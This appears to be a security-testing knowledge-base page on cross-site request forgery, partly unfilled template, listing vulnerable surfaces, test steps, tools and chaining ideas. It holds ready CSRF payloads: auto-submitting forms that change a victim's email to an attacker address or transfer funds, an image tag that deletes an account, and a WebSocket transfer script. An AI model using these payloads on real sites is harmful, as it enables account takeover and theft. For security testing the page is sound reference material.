# CSRF Techniques

> Tracked CVEs and techniques for this class. Updated via daily `refresh-latest` pipeline.

_Last updated: — · Items: 0_

---

## What

_Define the class, prerequisites, and typical finding shape. Fill with real content._
_pending enrichment — baseline opener below_

See items under ## Items for per-finding details.

---

## CVEs

_No CVE-assigned items yet. Items below are pre-CVE or class-level findings._

---

## Probes

_Grep, curl, nuclei probes for this class. Append as items arrive with real PoCs._
_pending enrichment_

---

## PoCs

_Public PoC links rolled up from items below._

_No PoCs in items yet._

---

## Reproduction

_Step-by-step repro steps per CVE. Populated as items arrive with enough detail._
_pending enrichment_

---

## Defense

_Patch guidance and detection rules. Populated from vendor advisories._
_pending enrichment_

---

## References

_Populated by daily refresh-latest pipeline._

---

## Items

> Cross-Site Request Forgery — tricking an authenticated user's browser into performing state-changing requests on a target site without their knowledge.

## Surface

- State-changing POST/PUT/DELETE endpoints without CSRF token validation
- Endpoints that accept `Content-Type: application/x-www-form-urlencoded` or `multipart/form-data` (browser-native, no preflight)
- APIs that rely solely on cookies for auth (no `Authorization` header required)
- `SameSite=None` cookies — cross-site requests include the cookie
- Missing or bypassable `Origin`/`Referer` validation
- WebSocket handshakes — Origin not validated server-side
- Password change, email change, fund transfer, settings endpoints

## Test Approach

1. **Check CSRF token presence** — remove the token, change method to GET, see if request succeeds
2. **Test token binding** — swap your CSRF token with an older/different token; check if server validates per-session or per-request
3. **Test `SameSite` cookie attribute**:
   - `SameSite=None; Secure` — exploitable from any cross-site page
   - `SameSite=Lax` — exploitable via top-level GET navigations (limited)
   - `SameSite=Strict` — hardest, but check for subdomain bypasses
4. **Cookie prefix bypass** — inject `__Host-` or `__Secure-` prefixed cookies via header injection:

   ```
   Cookie: __Host-session=attacker_value
   ```

5. **Referer/Origin bypass variants**:
   - Remove `Referer` header entirely
   - Set `Referer: https://target.com.attacker.com/path`
   - Append target: `Referer: https://attacker.com/?target.com`
6. **JSON CSRF** — if endpoint accepts JSON but no CSRF token, try `Content-Type: text/plain`:

   ```html
   <form method="POST" action="https://target.com/api/transfer">
     <input name='{"amount":1000,"to":"attacker"}' value='x'>
   </form>
   ```

7. **WebSocket CSRF** — connect to `wss://target.com/ws` from attacker origin, check if Origin validated

## Tools

- **Burp CSRF PoC generator** — right-click any request → Engagement tools → Generate CSRF PoC
- **XSRFProbe** — automated CSRF auditing: `python3 xsrfprobe.py -u https://target.com`
- **nuclei** — CSRF detection templates
- **Caido** — proxy-level request replay for CSRF token analysis

## Payloads / Probes

```html
<!-- Basic CSRF form -->
<html><body>
<form action="https://target.com/api/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
</body></html>

<!-- JSON CSRF via text/plain -->
<form method="POST" action="https://target.com/api/transfer"
  enctype="text/plain">
  <input name='{"amount":5000,"to":"attacker"' value='">}'>
</form>

<!-- CSRF via image tag (GET state change) -->
<img src="https://target.com/api/delete-account?confirm=yes">

<!-- WebSocket CSRF -->
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() { ws.send('{"action":"transfer","to":"attacker"}'); };
</script>
```

## Chain Opportunities

- **CSRF → ATO** — change email/password to attacker's, take over account
- **CSRF + XSS** — XSS delivers CSRF payload to authenticated victims at scale
- **CSRF → stored XSS** — CSRF triggers action that plants stored XSS payload
- **Cookie prefix bypass → CSRF** — inject session cookie to fix token, enables CSRF where SameSite would block
- **CSRF → privilege escalation** — admin performs CSRF-ed action granting attacker elevated role

## Recent Intel

- **`__Host-` / `__Secure-` prefix bypass** · Browser vs. server-side parsing discrepancy allows injecting cookies that spoof protected prefixes; undermines SameSite+prefix CSRF defenses · https://portswigger.net/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes
- **SameSite Lax bypass (2024)** · GET-based CSRF still works for top-level navigations under Lax; sites relying on SameSite without explicit CSRF tokens remain exploitable for account linking, OAuth flows
- **WebSocket CSRF** · WebSocket upgrade lacks CSRF protection by design in many frameworks; origin check is often absent — check handshake for `Origin` validation
